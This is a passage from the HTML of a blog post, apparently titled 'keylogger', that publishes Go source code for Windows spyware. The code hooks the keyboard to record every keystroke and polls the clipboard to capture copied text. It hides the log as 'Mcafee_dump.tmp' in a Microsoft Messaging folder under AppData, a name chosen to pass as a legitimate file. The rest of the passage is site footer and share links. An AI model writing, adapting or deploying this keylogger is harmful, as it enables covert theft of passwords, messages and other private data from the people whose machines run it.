class="keyword">string</span> = <span class="string">""</span></span><br><span class="line">	<span class="comment">//var write bool = false</span></span><br><span class="line">	keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)(<span class="function"><span class="keyword">func</span><span class="params">(nCode <span class="keyword">int</span>, wparam WPARAM, lparam LPARAM)</span> <span class="title">LRESULT</span></span> &#123;</span><br><span class="line">		<span class="keyword">if</span> nCode == <span class="number">0</span> &amp;&amp; wparam == WM_KEYDOWN &#123;</span><br><span class="line">			SHIFT, _, _ = procGetAsyncKeyState.Call(<span class="keyword">uintptr</span>(w32.VK_SHIFT))</span><br><span class="line">			<span class="keyword">if</span> SHIFT == <span class="number">32769</span> || SHIFT == <span class="number">32768</span> &#123;</span><br><span class="line"></span><br><span class="line">				SHIFT = <span class="number">1</span></span><br><span class="line">			&#125;</span><br><span class="line">			kbdstruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lparam))</span><br><span class="line">			code := <span class="keyword">byte</span>(kbdstruct.VkCode)</span><br><span class="line">			<span class="keyword">if</span> code == w32.VK_CAPITAL &#123;</span><br><span class="line">				<span class="keyword">if</span> CAPS == <span class="number">1</span> &#123;</span><br><span class="line">					CAPS = <span class="number">0</span></span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					CAPS = <span class="number">1</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> SHIFT == <span class="number">1</span> &#123;</span><br><span class="line">				CAPS2 = <span class="number">1</span></span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				CAPS2 = <span class="number">0</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//未按shift</span></span><br><span class="line">			<span class="keyword">if</span> CAPS == <span class="number">0</span> &amp;&amp; CAPS2 == <span class="number">0</span> &#123;</span><br><span class="line">				tmpKeylog += keys_low[<span class="keyword">uint16</span>(code)]</span><br><span class="line"></span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> CAPS2 == <span class="number">1</span> &#123;</span><br><span class="line">				tmpKeylog += keys_high[<span class="keyword">uint16</span>(code)]</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				tmpKeylog += capup[<span class="keyword">uint16</span>(code)]</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> tmpKeylog != <span class="string">""</span> &#123;</span><br><span class="line">			savefile(tmpKeylog)</span><br><span class="line">			precLog = tmpKeylog</span><br><span class="line">			tmpKeylog = <span class="string">""</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> CallNextHookEx(keyboardHook, nCode, wparam, lparam)</span><br><span class="line">	&#125;), <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> GetMessage(&amp;msg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) != <span class="number">0</span> &#123;</span><br><span class="line">		time.Sleep(<span class="number">1</span> * time.Millisecond)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	UnhookWindowsHookEx(keyboardHook)</span><br><span class="line">	keyboardHook = <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">clipboardLogger</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	text, _ := clipboard.ReadAll()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		text1, _ := clipboard.ReadAll()</span><br><span class="line">		<span class="keyword">if</span> text1 != <span class="string">""</span> &amp;&amp; text1 != text &#123;</span><br><span class="line">			tmpKeylog += <span class="keyword">string</span>(<span class="string">"\r\n[Clipboard: "</span> + text1 + <span class="string">"]\r\n"</span>)</span><br><span class="line">			text = text1</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		time.Sleep(<span class="number">20</span> * time.Millisecond)</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现延时写入文件 并加入时间戳</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getAppData</span><span class="params">()</span> <span class="title">string</span></span> &#123;</span><br><span class="line">	usr, err := user.Current()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">	app := usr.HomeDir + <span class="string">"\\AppData\\Local\\Packages\\Microsoft.Messaging_8wekyb3d8bbwe\\"</span></span><br><span class="line">	<span class="keyword">return</span> app</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isExist</span><span class="params">(filename <span class="keyword">string</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">	_, err := os.Stat(filename)</span><br><span class="line">	<span class="keyword">return</span> err == <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">savefile</span><span class="params">(str <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">	directory := getAppData()</span><br><span class="line">	dir := strings.Replace(directory, <span class="string">"\\"</span>, <span class="string">"/"</span>, <span class="number">-1</span>)</span><br><span class="line">	<span class="comment">//log.Printf(dir)</span></span><br><span class="line">	<span class="keyword">if</span> !isExist(dir) &#123;</span><br><span class="line">		err := os.MkdirAll(dir, <span class="number">0777</span>)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatal(<span class="string">"cannot create directory"</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	f, err := os.OpenFile(dir+<span class="string">"Mcafee_dump.tmp"</span>, os.O_RDWR|os.O_CREATE|os.O_APPEND, <span class="number">0644</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">"file open error : %v"</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> f.Close()</span><br><span class="line">	log.SetOutput(f)</span><br><span class="line">	log.Printf(str)</span><br><span class="line">	time.Sleep(<span class="number">20</span> * time.Millisecond)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
  </div>
</article>



    </div>
    
      <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#声明"><span class="toc-number">1.</span> <span class="toc-text">声明</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#说明"><span class="toc-number">2.</span> <span class="toc-text">说明</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://wolvez.club/2019/10/12/keylogger/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://wolvez.club/2019/10/12/keylogger/&text=keylogger"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://wolvez.club/2019/10/12/keylogger/&title=keylogger"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wolvez.club/2019/10/12/keylogger/&is_video=false&description=keylogger"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=keylogger&body=Check out this article: http://wolvez.club/2019/10/12/keylogger/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://wolvez.club/2019/10/12/keylogger/&title=keylogger"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://wolvez.club/2019/10/12/keylogger/&title=keylogger"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://wolvez.club/2019/10/12/keylogger/&title=keylogger"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://wolvez.club/2019/10/12/keylogger/&title=keylogger"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://wolvez.club/2019/10/12/keylogger/&name=keylogger&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

    
    <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 wolvez
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/Search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

</body>
</html>
<!-- styles -->
<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">

<!-- jquery -->
<script src="/lib/jquery/jquery.min.js"></script>
<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
<script src="/js/main.js"></script>




